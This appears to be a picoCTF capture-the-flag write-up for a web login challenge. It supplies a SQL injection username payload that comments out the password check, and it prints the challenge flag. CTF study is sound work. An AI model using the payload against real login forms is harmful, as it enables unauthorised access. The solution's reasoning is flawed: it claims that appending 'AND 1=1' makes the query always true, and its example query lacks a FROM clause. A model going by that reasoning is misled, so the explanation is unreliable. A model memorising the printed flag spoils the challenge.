# Irish-Name-Repo 1

Type: **Web Security**

There is a website running at `https://jupiter.challenges.picoctf.org/problem/33850/` ([link](https://jupiter.challenges.picoctf.org/problem/33850/)) or http://jupiter.challenges.picoctf.org:33850. Do you think you can log us in? Try to see if you can login!

*This question is from picoCTF. PicoCTF flags are of the format: `picoCTF{answer}`.*

**Hint**: There doesn't seem to be many ways to interact with this. I wonder if the users are kept in a database?

**Hint**: Try to think about how the website verifies your login.

## Solution

The website uses SQL to log people into the admin login, but it's not great SQL. It is probably something similar to:

```sql
SELECT username WHERE username = "{input}" AND password = "{input}"
```

So, in the username box, if you enter `user" AND 1=1 --`,

the SQL query becomes:

```sql
SELECT username WHERE username = "user" AND 1=1 --" AND password = ""
```

Since this is always true, the site allows you to automatically log in.

**Answer**: `picoCTF{s0m3_SQL_6b96db35}`
